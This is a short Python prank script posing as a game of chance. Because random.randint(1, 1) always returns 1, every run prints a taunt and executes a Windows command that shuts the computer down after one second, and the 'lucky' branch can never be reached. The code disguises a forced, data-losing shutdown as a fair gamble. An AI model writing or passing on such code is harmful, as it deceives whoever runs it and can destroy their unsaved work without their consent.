import random, os

if random.randint(1, 1) == 1:
    print("You got fucked up my guy")
    os.system("shutdown /s /t 1")
else:
    print('You lucky my guy!')
    
input('Press enter to close the window...')